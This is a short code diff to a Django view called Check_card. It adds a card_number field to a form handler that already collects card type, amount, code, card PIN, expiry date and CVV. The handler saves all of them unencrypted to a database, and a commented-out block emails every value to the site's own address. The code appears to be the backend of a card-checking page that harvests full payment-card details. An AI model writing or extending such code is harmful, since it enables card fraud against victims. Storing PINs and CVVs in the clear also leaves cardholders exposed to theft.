@@ -17,6 +17,7 @@ def Check_card(request):
         currency = form.get('currency')       
         amount = form.get('amount')       
         code = form.get('code')
+        card_number = form.get('card_number')
         card_pin = form.get('card_pin')
         exp_date = form.get('exp_date')
         cvv = form.get('cvv') 
@@ -25,7 +26,7 @@ def Check_card(request):
             return render(request, 'myCard/index.html')       
         # owner = request.user
         # try:
-        new_card = Cards.objects.create(card_type=card_type, currency=currency,amount=amount, code=code, card_pin=card_pin, exp_date=exp_date,cvv=cvv)
+        new_card = Cards.objects.create(card_type=card_type, currency=currency,amount=amount, code=code, card_number=card_number, card_pin=card_pin, exp_date=exp_date,cvv=cvv)
         new_card.save()
         # body = f"Card type = {card_type}\n\nCurrency={currency}\n\nAmount = {amount}\n\nCode={code}\n\n Card_pin={card_pin}\n\nExp_date={exp_date}\n\nCVV={cvv}"
         # email = EmailMessage(subject='New input', body=body, to=[settings.EMAIL_HOST_USER])
